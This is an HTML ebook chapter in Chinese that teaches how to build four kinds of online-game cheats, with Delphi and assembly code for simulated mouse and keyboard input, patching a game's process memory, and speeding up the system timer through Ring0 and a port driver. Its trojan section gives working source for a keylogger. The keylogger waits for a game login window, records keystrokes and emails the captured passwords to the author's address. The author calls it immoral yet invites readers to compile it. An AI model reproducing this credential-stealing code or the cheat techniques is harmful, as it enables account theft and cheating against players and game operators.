<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<base target="_blank" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<script type="text/javascript">
var userAgent = navigator.userAgent.toLowerCase();
var browser = 
	(browser = userAgent.match(/qqbrowser\/([\d.]+)/))?"qqbrowser/"+browser[1]:
	(browser = userAgent.match(/se\s+2.x/))?"sogou/2.x": //65.29%
	(browser = userAgent.match(/msie\s+([\d.]+)/))?"msie/"+browser[1]: //ie
	(browser = userAgent.match(/chrome\/([\d.]+)/))?"chrome/"+browser[1]: //chrome
	(browser = userAgent.match(/firefox\/([\d.]+)/))?"firefox/"+browser[1]: //firefox
	(browser = userAgent.match(/version\/([\d.]+)\s+safari\/([\d.]+)/))?"safari/"+browser[1]: //safari
	(browser = userAgent.match(/opera\/([\d.]+)([\w\W]+)version\/([\d.]+)/))?"opera/"+browser[3]: //opera
	"other browser";
	var browser4 = browser.substr(0,2);
//实现回到页面顶部  
function goTopEx(){  
	var obj=document.getElementById("goTopBtn"); 
	var obj2=document.getElementById("shangy"); 
	var obj3=document.getElementById("xiay");
	var obj4=document.getElementById("goBottom");  
	
	function getScrollTop(){  
		if(browser4=="ch"){
			//谷歌浏览器  
			return document.documentElement.scrollTop; 
		}else{
			//IE、firefox等浏览器 
			return document.documentElement.scrollTop;  
		}  
	}
	function setScrollTop(value){ 
		if(browser4=="ch"){ 
			//谷歌浏览器  
			document.documentElement.scrollTop=value; 
		}else{  
			//IE、firefox等浏览器
			document.documentElement.scrollTop=value;  
		} 
	}     
	window.onscroll=function(){getScrollTop()>50?obj.style.display="":obj.style.display="none";
	getScrollTop()>100?obj2.style.display="":obj2.style.display="none";
	document.body.clientHeight-getScrollTop()>650?obj3.style.display="":obj3.style.display="none";
	document.body.clientHeight-getScrollTop()>650?obj4.style.display="":obj4.style.display="none";
	}  
	obj.onclick=function(){  
		var goTop=setInterval(scrollMove,10);  
		function scrollMove(){  
				setScrollTop(getScrollTop()/1.1);  
				if(getScrollTop()<1)clearInterval(goTop);  
		}  
	}  
}  
function downn(){
	if(browser4=="ch"){
		//谷歌浏览器  
		window.scrollBy(0,document.body.clientHeight);
	}else{
		//IE、firefox等浏览器  
		window.scrollBy(0,document.documentElement.clientHeight*1000); 
	}
}
</script>
<script>
document.write('<div style="position:fixed; right: 10px; top:20px; color:#eee;">背景颜色<br><select name=bcolor id=bcolor onchange="javascript:document.body.style.background=this.options[this.selectedIndex].value;"><option style="background-color: #ffffff" value="#ffffff">白色</option><option style="background-color: #f6f6f6" value="#f6f6f6">银灰</option><option style="background-color: #e4ebf1" value="#e4ebf1">淡蓝</option><option style="background-color: #e6f3ff" value="#e6f3ff">蓝色</option> <option style="background-color: #eeeeee" value="#eeeeee">淡灰</option><option style="background-color: #eaeaea" value="#eaeaea">灰色</option>  <option style="background-color: #e4e1d8" value="#e4e1d8">深灰</option><option style="background-color: #e6e6e6" value="#e6e6e6">暗灰</option><option style="background-color: #eefaee" value="#eefaee">绿色</option><option style="background-color: #ffffed" value="#ffffed">明黄</option><option style="background-color: #333333" value="#333333">黑色</option></select><br>字体颜色<br><select name=txtcolor id=txtcolor onchange="javascript:document.getElementById(\'container\').style.color=this.options[this.selectedIndex].value;"> <option value="#000000">黑色</option><option value="#ff0000">红色</option><option value="#006600">绿色</option><option value="#0000ff">蓝色</option><option value="#660000">棕色</option><option value="#ffffff">白色</option></select><br>字体大小<br><select name=fonttype id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontSize=this.options[this.selectedIndex].value;"> <option value="12px" >小号</option> <option value="14px" >较小</option> <option value="19px" >中号</option> <option value="19px" >默认</option><option value="22px" >较大</option><option value="25px" >大号</option><option value="35px" >35px</option><option value="45px" >45px</option><option value="55px" >55px</option><option value="65px" >65px</option><option value="75px" >75px</option><option value="85px" >85px</option><option value="95px" >95px</option></select></div>');   
</script>
<style type="text/css">
#tbrowser a:link，#container a:visited{
	font-size:18px;
	text-decoration:none;
}
a:link{
	text-decoration:none;
	}
#container{
	font-size:1.2em;
	margin:auto;
	font-family:"宋体";
	width:40em;
	line-height:1.6em;
	//overflow:hidden;
}
P{
	margin-top:16px;
	margin-bottom:16px;
	text-indent:2em;
}
.uls{
	color:#CC6666;
	font-weight:bold;
}
.uls>ol{
	list-style:none;
	font-weight:normal;
	list-style:lower-latin;
	color:#000000;
	line-height:1.3em;
}
#goTopBtn, #goBottom, #shangy, #xiay, #menuPage, #lPage, #fPage, #ftsize1, #ftsize2, #ftsize3{
	width: 18px;
    line-height: 1.2;
    padding: 5px 0;
    font-size: 12px;
    text-align: center;
    position: fixed;
	right: 10px;
    cursor: pointer;
    filter: Alpha(opacity=30);
	opacity=.3;
	font-weight:bold;
}
#goTopBtn, #goBottom, #menuPage, #lPage, #fPage, #ftsize1, #ftsize3{
    background-color:#999;
    color:#000;
}
#shangy, #xiay, #lPage, #fPage, #ftsize, #ftsize2{
    background-color: #bbb;
    color: #000;
}
#fPage{
	bottom: 236px;
	height:42px;
	white-space:nowrap;
	overflow:hidden;
	//writing-mode:tb-rl;
}
#menuPage{
	bottom: 198px;
	height:27px;
	white-space:nowrap;
	overflow:hidden;
}
#lPage{
	bottom: 145px;
	height:42px;
	white-space:nowrap;
	overflow:hidden;
}
#ftsize1{
	bottom:360px;
}
#ftsize2{
	bottom:334px;
}
#ftsize3{
	bottom:308px;
}
#goTopBtn{
    bottom: 105px;
}
#goBottom {
    bottom: 30px;
}
#shangy {
    bottom: 80px;
}
#xiay {
    bottom: 55px;
}
#goTopBtn:hover, #goBottom:hover, #shangy:hover, #xiay:hover, #menuPage:hover, #lPage:hover, #fPage:hover, #ftsize1:hover, #ftsize2:hover, #ftsize3:hover{
	background-color:#ccc;
	border:#ccc 0px solid;
}
#goTopBtn a:link, #goBottom a:link, #xiay a:link, #shangy a:link, #menuPage a:link, #ftsize1 a:link, #ftsize2 a:link, #ftsize3 a:link, #menuPage a:visited, #lPage a:link, #fPage a:link, #lPage a:visited, #fPage a:visited {
	text-decoration: none;
	color:white;
}
img{
	margin-right:2em;
	text-indent:2em;
	border:0;
}
.picsay{
	color:#930;
	font-size:90%;
	line-height:110%;
	margin-top:-12px;
	padding:0;
}
.remark{
	color:#930;
	font-size:90%;
	line-height:140%;
	margin-top:-12px;
	text-indent:0em;
	padding:0;
}
.ref{
	color:#930;
	font-size:95%;
	line-height:150%;
	margin-top:-12px;
	text-indent:2em;
	padding:0;
}
.lettle{
	font-size:110%;
	line-height:160%;
	
	padding:0;
	color:#930;
	text-indent:2em;
}
sub,sup{
	font-size:80%;
	color:red;
}
.layout, .layout2{
    clear:both;
	width:95%;
	border:1px dotted #eee;
	margin:auto;
	margin-bottom:5px;
	overflow:hidden;
}
.layout2 .right, .layout2 .left, .layout p{
margin-bottom:-55px;
padding-bottom:55px;
text-align: justify;
margin:0;
padding:0;
margin-left:1%;
margin-right:1%;
}
.layout2 .left, .layout p{
float:left;
width:60%;
font-size:1.0em;
}
.layout2 .right,  .layout p+p {
	float: left;
	width:34%;
	border-left:1px dotted #cccccc;
	font-size:0.9em;
	padding-left:1%;
	
}
.layout2 .right p, .layout2 .left p, .layout p{
padding-bottom:5px;
}
h2{
	font-size:1.2em;
	font-weight:bold;
	margin-top:0px;
	margin-bottom:0px;
	text-indent:0em;
	color:#990000;
	height:1.5em;
}
h3{
	text-indent:0em;
	font-size:1.2em;
	height:1.5em;
	padding:0;
	margin:0;
	color:#990000;
}
h4{
	text-indent:0em;
	font-size:1em;
	height:1.5em;
	padding:0;
	margin:0;
	color:#990000;
}
.title
{
	text-indent:0em; font-weight:bold;
	font-size:120%;
}
pre{
	font-size:120%;
	line-height:130%;
	padding:0;
	//background-color:#f6f6f6;
	//background-color:#fff5ee;
	//background-color:#ffe;
	background-color:#eee;
	padding:8px;
	margin-left:2em;
	color:blue;
	}
</style>
</head>
<body>
<div id="container">
﻿四种网络游戏外挂的制作方法

<p>在几年前我看到别人玩网络游戏用上了外挂，做为程序员的我心里实在是不爽，想搞清楚这到底是怎么回事。就拿了一些来研究，小有心得，拿出来与大家共享，外挂无非就是分几种罢了（依制作难度）：</p>


<p>1、动作式，所谓动作式，就是指用API发命令给窗口或API控制鼠标、键盘等，使游戏里的人物进行流动或者攻击，最早以前的“石器”外挂就是这种方式。（这种外挂完全是垃圾，TMD，只要会一点点API的人都知道该怎么做，不过这种外挂也是入门级的好东东，虽然不能提高你的战斗力，但是可以提高你的士气）</p>


<p>2、本地修改式，这种外挂跟传统上的一些游戏修改器没有两样，做这种外挂在编程只需要对内存地址有一点认识并且掌握API就可以实现，“精灵”的外挂这是这种方式写成的，它的难点在于找到那些地址码，找地址一般地要借助于别人的工具，有的游戏还有双码校验，正正找起来会比较困难。（这种外挂，比上一种有一点点难度，但是这种外挂做起来能够用，也是有一定难度的啦~~，这种外挂可以很快提升你对内存地址的理解及应用，是你编程技术提高的好东东）</p>


<p>3、木马式，这种外挂的目的是帮外挂制作者偷到用户的密码（TMD，“烂”就一个字，不过要知已知彼所以还是要谈一下啦~~），做这种外挂有一定的难度，需要HOOK或键盘监视技术做底子，才可以完成，它的原理是先首截了用户的帐号或密码，然后发到指定邮箱。（我以前写过这样的东东，但是从来没有用过，我知道这种东东很不道德，所以以后千万别用呀！）</p>


<p>4、加速式，这种外挂可以加快游戏的速度……（对不起大家，这种东东我没有实际做过，所以不能妄自评，惭愧）</p>


<p>这几种外挂之中，前三种可以用VB，Delphi等语言比较好实现，后两种则要用VC等底层支持比较好的编程工具才好实现。 </p>


<p><h4>1 动作式外挂</h4></p>


<p>首先，先来谈一下动作式的外挂，这也是我第一次写外挂时做的最简单的一种。</p>


<p>记得还在“石器”时代的时候，我看到别人挂着一种软件（外挂）人物就可以四外游走（当时我还不知道外挂怎么回事），于是找了这种软件过来研究（拿来后才听别人说这叫外挂），发现这种东东其实实现起来并不难，仔佃看其实人物的行走无非就是鼠标在不同的地方点来点去而已，看后就有实现这功能的冲动，随后跑到MSDN上看了一些资料，发现这种实现这几个功能，只需要几个简单的API函数就可以搞定：</p>


<p>1、首先我们要知道现在鼠标的位置（为了好还原现在鼠标的位置）所以我们就要用到API函数GetCursorPos，它的使用方法如下：</p>



<pre>
BOOL GetCursorPos( 
    LPPOINT lpPoint // address of structure for cursor position 
); 
</pre>



<p> 2、我们把鼠标的位置移到要到人物走到的地方，我们就要用到SetCursorPos函数来移动鼠标位置，它的使用方法如下：</p>



<pre>
BOOL SetCursorPos(
    int X, // horizontal position 
    int Y  // vertical position
); 
</pre>



<p>3、模拟鼠标发出按下和放开的动作，我们要用到mouse_event函数来实现，具休使用方法用下：</p>



<pre>
VOID mouse_event(
    DWORD dwFlags, // flags specifying various motion/click variants
    DWORD dx,      // horizontal mouse position or position change
    DWORD dy,      // vertical mouse position or position change
    DWORD dwData,  // amount of wheel movement
    DWORD dwExtraInfo // 32 bits of application-defined information
); 
</pre>



<p>在它的dwFlags处，可用的事件很多如移动MOUSEEVENTF_MOVE，左键按下MOUSEEVENTF_LEFTDOWN，左键放开MOUSEEVENTF_LEFTUP，具体的东东还是查一下MSDN吧~~~~~</p>


<p> 好了，有了前面的知识，我们就可以来看看人物移走是怎么实现的了：</p>



<pre>
getcursorpos(point);
setcursorpos(ranpoint(80,windowX),ranpoint(80,windowY));//ranpoint是个自制的随机坐标函数
mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
setcursorpos(point.x,point.y); 
</pre>



<p>看了以上的代码，是不是觉得人物的游走很简单啦~~，举一仿三，还有好多好东东可以用这个技巧实现（我早就说过，TMD，这是垃圾外挂的做法，相信了吧~~~），接下来，再看看游戏里面自动攻击的做法吧（必需游戏中攻击支持快捷键的），道理还是一样的，只是用的API不同罢了~~~，这回我们要用到的是keybd_event函数，其用法如下：</p>





<pre>
VOID keybd_event(
    BYTE bVk,         // virtual-key code
    BYTE bScan,       // hardware scan code
    DWORD dwFlags,    // flags specifying various function options
    DWORD dwExtraInfo // additional data associated with keystroke
); 
</pre>



<p>我们还要知道扫描码不可以直接使用，要用函数MapVirtualKey把键值转成扫描码，MapVirtualKey的具体使用方法如下：</p>



<pre>
UINT MapVirtualKey(
    UINT uCode,   // virtual-key code or scan code
    UINT uMapType // translation to perform
); 
</pre>



<p>好了，比说此快接键是CTRL+A，接下来让我们看看实际代码是怎么写的：</p>



<pre>
keybd_event(VK_CONTROL,mapvirtualkey(VK_CONTROL,0),0,0);
keybd_event(65,mapvirtualkey(65,0),0,0);
keybd_event(65,mapvirtualkey(65,0),keyeventf_keyup,0);
keybd_event(VK_CONTROL,mapvirtualkey(VK_CONTROL,0),keyeventf_keyup,0); 
</pre>


<p>首先模拟按下了CTRL键，再模拟按下A键，再模拟放开A键，最后放开CTRL键，这就是一个模拟按快捷键的周期。</p>


<p>（看到这里，差不多对简易外挂有了一定的了解了吧~~~~做一个试试？如果你举一仿三还能有更好的东东出来，这就要看你的领悟能力了~~，不过不要高兴太早这只是才开始，以后还有更复杂的东东等着你呢~~）</p>


<p><h4>2 本地修改式外挂</h4></p>


<p>现在我们来看看，比动作式外挂更进一步的外挂——本地修改式外挂的整个制作过程进行一个详细的分解。</p>


<p>具我所知，本地修改式外挂最典型的应用就是在“精灵”游戏上面，因为我在近一年前（“精灵”还在测试阶段），我所在的公司里有很多同事玩“精灵”，于是我看了一下游戏的数据处理方式，发现它所发送到服务器上的信息是存在于内存当中（我看后第一个感受是：修改这种游戏和修改单机版的游戏没有多大分别，换句话说就是在他向服务器提交信息之前修改了内存地址就可以了），当时我找到了地址于是修改了内存地址，果然，按我的想法修改了地址，让系统自动提交后，果然成功了~~~~~，后来“精灵”又改成了双地址校检，内存校检等等，在这里我就不废话了~~~~，OK，我们就来看看这类外挂是如何制作的：</p>


<p>在做外挂之前我们要对Windows的内存有个具体的认识，而在这里我们所指的内存是指系统的内存偏移量，也就是相对内存，而我们所要对其进行修改，那么我们要对几个Windows API进行了解，OK，跟着例子让我们看清楚这种外挂的制作和API的应用（为了保证网络游戏的正常运行，我就不把找内存地址的方法详细解说了）：</p>


<p>1、首先我们要用FindWindow,知道游戏窗口的句柄，因为我们要通过它来得知游戏的运行后所在进程的ID，下面就是FindWindow的用法：</p>



<pre>
HWND FindWindow(
    LPCTSTR lpClassName, // pointer to class name
    LPCTSTR lpWindowName // pointer to window name
); 
</pre>



<p>2、我们GetWindowThreadProcessId来得到游戏窗口相对应进程的进程ID，函数用法如下：</p>



<pre>
DWORD GetWindowThreadProcessId(
    HWND hWnd, // handle of window
    LPDWORD lpdwProcessId           // address of variable for process identifier
);

</pre>


<p>3、得到游戏进程ID后，接下来的事是要以最高权限打开进程，所用到的函数OpenProcess的具体使用方法如下：</p>



<pre>
HANDLE OpenProcess(
    DWORD dwDesiredAccess, // access flag 
    BOOL bInheritHandle,   // handle inheritance flag 
    DWORD dwProcessId      // process identifier 
); 
</pre>



<p>在dwDesiredAccess之处就是设存取方式的地方，它可设的权限很多，我们在这里使用只要使用PROCESS_ALL_ACCESS 来打开进程就可以，其他的方式我们可以查一下MSDN。</p>


<p>4、打开进程后，我们就可以用函数对存内进行操作，在这里我们只要用到WriteProcessMemory来对内存地址写入数据即可（其他的操作方式比如说：ReadProcessMemory等，我在这里就不一一介绍了），我们看一下WriteProcessMemory的用法：</p>



<pre>
BOOL WriteProcessMemory(
    HANDLE hProcess,                // handle to process whose memory is written to 
    LPVOID lpBaseAddress,           // address to start writing to 
    LPVOID lpBuffer,                // pointer to buffer to write data to
    DWORD nSize,                    // number of bytes to write
    LPDWORD lpNumberOfBytesWritten  // actual number of bytes written 
); 
</pre>



<p>5、下面用CloseHandle关闭进程句柄就完成了。</p>


<p>这就是这类游戏外挂的程序实现部份的方法，好了，有了此方法，我们就有了理性的认识，我们看看实际例子，提升一下我们的感性认识吧，下面就是XX游戏的外挂代码，我们照上面的方法对应去研究一下吧：</p>



<pre>
const
ResourceOffset: dword = $004219F4;
resource: dword = 3113226621;
ResourceOffset1: dword = $004219F8;
resource1: dword = 1940000000;
ResourceOffset2: dword = $0043FA50;
resource2: dword = 1280185;
ResourceOffset3: dword = $0043FA54;
resource3: dword = 3163064576;
ResourceOffset4: dword = $0043FA58;
resource4: dword = 2298478592;
var
hw: HWND;
pid: dword;
h: THandle;
tt: Cardinal;
begin
hw := FindWindow('XX', nil);
if hw = 0 then
Exit;
GetWindowThreadProcessId(hw, @pid);
h := OpenProcess(PROCESS_ALL_ACCESS, false, pid);
if h = 0 then
Exit;
if flatcheckbox1.Checked=true then
begin
WriteProcessMemory(h, Pointer(ResourceOffset), @Resource, sizeof(Resource), tt);
WriteProcessMemory(h, Pointer(ResourceOffset1), @Resource1, sizeof(Resource1), tt);
end;
if flatcheckbox2.Checked=true then
begin
WriteProcessMemory(h, Pointer(ResourceOffset2), @Resource2, sizeof(Resource2), tt);
WriteProcessMemory(h, Pointer(ResourceOffset3), @Resource3, sizeof(Resource3), tt);
WriteProcessMemory(h, Pointer(ResourceOffset4), @Resource4, sizeof(Resource4), tt);
end;
MessageBeep(0);
CloseHandle(h);
close; 

</pre>


<p>这个游戏是用了多地址对所要提交的数据进行了校验，所以说这类游戏外挂制作并不是很难，最难的是要找到这些地址。</p>


<p><h4>3 木马式外挂</h4></p>


<p>木马式外挂，可能大多像木马吧，是帮助做外挂的人偷取别人游戏的帐号及密码的东东。因为网络上有此类外挂的存在，所以今天不得不说一下（我个人是非常讨厌这类外挂的，请看过本文的朋友不要到处乱用此技术，谢谢合作）。要做此类外挂的程序实现方法很多（比如HOOK，键盘监视等技术），因为HOOK技术对程序员的技术要求比较高并且在实际应用上需要多带一个动态链接库，所以在文中我会以键盘监视技术来实现此类木马的制作。键盘监视技术只需要一个.exe文件就能实现做到后台键盘监视，这个程序用这种技术来实现比较适合。</p>


<p>在做程序之前我们必需要了解一下程序的思路：</p>


<p>1、我们首先知道你想记录游戏的登录窗口名称。</p>


<p>2、判断登录窗口是否出现。</p>


<p>3、如果登录窗口出现，就记录键盘。</p>


<p>4、当窗口关闭时，把记录信息，通过邮件发送到程序设计者的邮箱。</p>


<p>第一点我就不具体分析了，因为你们比我还要了解你们玩的是什么游戏，登录窗口名称是什么。从第二点开始，我们就开始这类外挂的程序实现之旅：</p>


<p>那么我们要怎么样判断登录窗口虽否出现呢？其实这个很简单，我们用FindWindow函数就可以很轻松的实现了：</p>



<pre>
HWND FindWindow(
    LPCTSTR lpClassName, // pointer to class name
    LPCTSTR lpWindowName // pointer to window name
); 
</pre>



<p>实际程序实现中，我们要找到'xx'窗口，就用FindWindow(nil,'xx')如果当返回值大于0时表示窗口已经出现，那么我们就可以对键盘信息进行记录了。</p>


<p>先首我们用SetWindowsHookEx设置监视日志，而该函数的用法如下：</p>



<pre>
HHOOK SetWindowsHookEx(
    int idHook,      // type of hook to install
    HOOKPROC lpfn,   // address of hook procedure
    HINSTANCE hMod,  // handle of application instance
    DWORD dwThreadId // identity of thread to install hook for 
);  
</pre>



<p>在这里要说明的是在我们程序当中我们要对HOOKPROC这里我们要通过写一个函数，来实现而HINSTANCE这里我们直接用本程序的HINSTANCE就可以了，具体实现方法为：</p>



<pre>
hHook := SetWindowsHookEx(WH_JOURNALRECORD, HookProc, HInstance, 0);  
</pre>



<p>而HOOKPROC里的函数就要复杂一点点：</p>



<pre>
function HookProc(iCode: integer; wParam: wParam; lParam: lParam): LResult; stdcall; 
begin 
if findedtitle then file://如果发现窗口后
begin 
if (peventmsg(lparam)^.message = WM_KEYDOWN) then file://消息等于键盘按下
hookkey := hookkey + Form1.Keyhookresult(peventMsg(lparam)^.paramL, peventmsg(lparam)^.paramH); file://通过keyhookresult（自定义的函数，主要功能是转换截获的消息参数为按键名称。我会在文章尾附上转化函数的）转换消息。
if length(hookkey) > 0 then file://如果获得按键名称
begin 
Write(hookkeyFile,hookkey); file://把按键名称写入文本文件
hookkey := ''; 
end; 
end; 
end;  
</pre>



<p>以上就是记录键盘的整个过程，简单吧，如果记录完可不要忘记释放呀，UnHookWindowsHookEx(hHook)，而hHOOK,就是创建setwindowshookex后所返回的句柄。</p>


<p>我们已经得到了键盘的记录，那么现在最后只要把记录的这些信息发送回来，我们就大功造成了。其他发送这块并不是很难，只要把记录从文本文件里边读出来，用DELPHI自带的电子邮件组件发一下就万事OK了。代码如下：</p>



<pre>
assignfile(ReadFile,'hook.txt'); file://打开hook.txt这个文本文件
reset(ReadFile); file://设为读取方式
try 
While not Eof(ReadFile) do file://当没有读到文件尾
begin 
Readln(ReadFile,s,j); file://读取文件行
body:=body+s; 
end; 
finally 
closefile(ReadFile); file://关闭文件
end; 
nmsmtp1.EncodeType:=uuMime; file://设置编码
nmsmtp1.PostMessage.Attachments.Text:=''; file://设置附件
nmsmtp1.PostMessage.FromAddress:='XXX@XXX.com'; file://设置源邮件地址
nmsmtp1.PostMessage.ToAddress.Text:='XXX@XXX.com'; /设置目标邮件地址
nmsmtp1.PostMessage.Body.Text:='密码'+' '+body; file://设置邮件内容
nmsmtp1.PostMessage.Subject:='password'; file://设置邮件标题
nmsmtp1.SendMail; file://发送邮件 

</pre>


<p>这个程序全部功能已经实现，编编试试。</p>


<p><h4>4 加速型外挂</h4></p>


<p>原本我一直以为加速外挂是针对某个游戏而写的，后来发现我这种概念是不对的，所谓加速外挂其实是修改时钟频率达到加速的目的。</p>


<p>以前DOS时代玩过编程的人就会马上想到，这很简单嘛不就是直接修改一下8253寄存器嘛，这在以前DOS时代可能可以行得通，但是windows则不然。windows是一个32位的操作系统，并不是你想改哪就改哪的（微软的东东就是如此霸气，说不给你改就不给你改），但要改也不是不可能，我们可以通过两种方法来实现：第一是写一个硬件驱动来完成，第二是用Ring0来实现（这种方法是CIH的作者陈盈豪首用的，它的原理是修改一下IDE表->创建一个中断门->进入Ring0->调用中断修改向量，但是没有办法只能用ASM汇编来实现这一切*_*，做为高级语言使用者惨啦！），用第一种方法用点麻烦，所以我们在这里就用第二种方法实现吧~~~</p>


<p>在实现之前我们来理一下思路吧：</p>


<p>1、我们首先要写一个过程在这个过程里嵌入汇编语言来实现修改IDE表、创建中断门，修改向量等工作</p>


<p>2、调用这个过程来实现加速功能</p>


<p>好了，现在思路有了，我们就边看代码边讲解吧：</p>


<p>首先我们建立一个过程，这个过程就是本程序的核心部份：</p>



<pre>
procedure SetRing(value:word); stdcall; 
const ZDH = $03; ／／ 设一个中断号
var
IDT : array [0..5] of byte; ／／ 保存IDT表
OG : dword; ／／存放旧向量
begin
asm
push ebx
sidt IDT ／／读入中断描述符表
mov ebx, dword ptr [IDT+2] ／／IDT表基地址
add ebx, 8*ZDH ／／计算中断在中断描述符表中的位置
cli ／／关中断
mov dx, word ptr [ebx+6] 
shl edx, 16d 
mov dx, word ptr [ebx] 
mov [OG], edx 
mov eax, offset @@Ring0 ／／指向Ring0级代码段
mov word ptr [ebx], ax ／／低16位,保存在1,2位
shr eax, 16d
mov word ptr [ebx+6], ax ／／高16位，保存在6,7位
int ZDH ／／中断
mov ebx, dword ptr [IDT+2] ／／重新定位
add ebx, 8*ZDH
mov edx, [OG]
mov word ptr [ebx], dx
shr edx, 16d
mov word ptr [ebx+6], dx ／／恢复被改了的向量
pop ebx
jmp @@exitasm ／／到exitasm处
@@Ring0: ／／Ring0,这个也是最最最核心的东东
mov al,$34 ／／写入8253控制寄存器
out $43,al
mov ax,value　／／写入定时值
out $40,al ／／写定时值低位
mov al,ah
out $40,al ／／写定时值高位
iretd ／／返回
@@exitasm:
end;
end; 
</pre>


<p>最核心的东西已经写完了，大部份读者是知其然不知其所以然吧，呵呵，不过不知其所以然也然。下面我们就试着用一下这个过程来做一个类似于“变速齿轮”的一个东东吧！</p>


<p>先加一个窗口，在窗口上放上一个trackbar控件把其Max设为20，Min设为1，把Position设为10，在这个控件的Change事件里写上：</p>



<pre>
SetRing(strtoint('$'+inttostr(1742+(10-trackbar1.Position)*160))); 
</pre>



<p>因为windows默认的值为$1742，所以我们把1742做为基数，又因为值越小越快，反之越慢的原理，所以写了这样一个公式，好了，这就是“变速齿轮”的一个Delphi＋ASM版了（只适用于win9X），呵呵，试一下吧，这对你帮助会很大的，呵呵。</p>


<p>在win2000里，我们不可能实现在直接对端口进行操作，Ring0也失了效，有的人就会想到，我们可以写驱动程序来完成呀，但在这里我告诉你，windows2000的驱动不是一个VxD就能实现的，像我这样的低手是写不出windows所用的驱动WDM的，没办法，我只有借助外力实现了，ProtTalk就是一个很好的设备驱动，他很方便的来实现对低层端口的操作，从而实现加速外挂。</p>


<p>1、我们首先要下一个PortTalk驱动，他的官方网站是http://www.beyondlogic.org</p>


<p>2、我们要把里面的prottalk.sys拷贝出来。</p>


<p>3、建立一个Protalk.sys的接口（我想省略了，大家可以上http://www.freewebs.com/liuyue/porttalk.pas下个pas文件自己看吧）</p>


<p>4、实现加速外挂。</p>


<p>下面就讲一下这程序的实现方法吧，如果说用ProtTalk来操作端口就容易多了，比win98下用ring权限操作方便。</p>


<p>1、新建一个工程，把刚刚下的接口文件和Protalk.sys一起拷到工程文件保存的文件夹下。</p>


<p>2、我们在我们新建的工程加入我们的接口文件</p>



<pre>
uses
windows,ProtTalk…… 
</pre>



<p>3、我们建立一个过程</p>



<pre>
procedure SetRing(value:word); 
begin
if not OpenPortTalk then exit;
outportb($43,$34);
outportb($40,lo(Value));
outprotb($40,hi(value));
ClosePortTalk;
end; 
</pre>



<p>4、先加一个窗口，在窗口上放上一个trackbar控件把其Max设为20，Min设为1，把Position设为10，在这个控件的Change事件里写上：</p>



<pre>
SetRing(strtoint('$'+inttostr(1742+(10-trackbar1.Position)*160))); 
</pre>



<p>就这么容易。</p>
﻿
</div>
<div>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.4em";' target="_self" style="color:#fff;" title="大：1.4em"><div id="ftsize1" style="color:#fff;">大</div></a>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.2em";' target="_self" style="color:#fff;" title="中：1.2em"><div id="ftsize2" style="color:#fff;">中</div></a>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.0em";' target="_self" style="color:#fff;" title="小：1em"><div id="ftsize3" style="color:#fff;">小</div></a>
<a id="fPagea" href="index.html" target="_self"><div id="fPage" style="color:#fff;">上<br>一<br>章</div></a>
<a href="index.html" target="_self"><div id="menuPage" style="color:#fff;">目<br>录</div></a>
<a id="LPagea" href="javascript:void(null)" target="_self"><div id="lPage" style="color:#fff;">下<br>一<br>章</div></a>
<a target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="goTopBtn">&and;</div></a>
<a onclick="shangy()" target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="shangy">&uarr;</div></a>
<a onclick="xiay()" target="_self" style="color:#fff;"><div id="xiay" style="color:#fff;">&darr;</div></a>
<a onclick="downn()" target="_self" style="color:#fff;"><div id="goBottom" style="color:#fff;">&or;</div></a>
<script type=text/javascript>
	goTopEx();
	function xiay(){
		window.scrollBy(0,window.innerHeight-10);
	}
	function shangy(){
		window.scrollBy(0,-window.innerHeight+10);
	}
	var obj3=document.getElementById("xiay");
	var obj4=document.getElementById("goBottom");
	function getHeight(){  
		if(browser4=="ch"){
			//谷歌浏览器  
			return document.body.clientHeight; 
		}else{
			//IE、firefox等浏览器 
			return document.documentElement.clientHeight;  
		}  
	}
	getHeight()<window.innerHeight+50?obj3.style.display="none":obj3.style.display="";
	getHeight()<window.innerHeight+50?obj4.style.display="none":obj4.style.display="";
	if(browser4!="ch"){	//firefox需要尝一下才显示向下图标
		xiay();
		shangy();
	}
	//上一页、下一页按钮，需要文件名是数字
	var strUrl=window.location.href;
	var arrUrl=strUrl.split("/");
	var thispage=arrUrl[arrUrl.length-1];
	var thispage2=thispage.split(".");
	var thispage3=thispage2[thispage2.length-2];
	if(thispage3 == 0){
		var obj5=document.getElementById("fPage");
		obj5.style.display="none";
	}else{
		var fpage = thispage3 - 1;
		fpage = fpage +".html";
		document.getElementById("fPagea").href=fpage;
	}
	if(thispage3 == 31){
		var obj6=document.getElementById("lPage");
		obj6.style.display="none";
	}else{
		var fpage = parseInt(thispage3) + 1;
		fpage = fpage +".html";
		document.getElementById("LPagea").href=fpage;
	}
</script>
</div>
</body>
</html>
